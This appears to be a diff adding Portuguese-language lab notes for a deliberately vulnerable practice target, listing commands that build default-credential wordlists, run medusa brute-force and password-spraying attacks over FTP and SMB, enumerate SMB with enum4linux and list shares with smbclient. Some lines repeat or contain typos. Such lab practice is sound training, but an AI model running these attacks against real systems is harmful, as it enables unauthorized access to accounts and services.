@@ -1,0 +1,62 @@
+
+Criando Arquivos de Usuários e Senhas Comuns 
+
+echo -e "user\nmsfadmin\nadmin\root" > users.txt
+
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6
+
+medusa -h 192.168.254.3 -U users.txt -P pass.txt -M ftp -t 6
+
+
+
+Ataques de Força Bruta em Formulários de Login Web
+
+http://192.168.254.3/dvwa/login.php
+
+
+
+Criação de Word Lists
+
+echo -e "user\nmfadmin\nadmin\nroot" > users.txt 
+
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+
+
+
+Ataque em Cadeia :Enumeração SMB e Password Spraying 
+
+
+Simulando um Cenário Corporativo Mal Configurado
+
+
+enum4linux -a 192.168.254.3 | tee enum4_output.txt 
+
+less enum4_output.txt
+
+
+
+Criando uma lista de usuários 
+
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+medusa -h 192.168.254.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 
+
+
+
+Testando o acesso utilizando Smbclient 
+
+
+smbclient -L //192.168.254.3 -U msfadmin
+
+
+
+
+
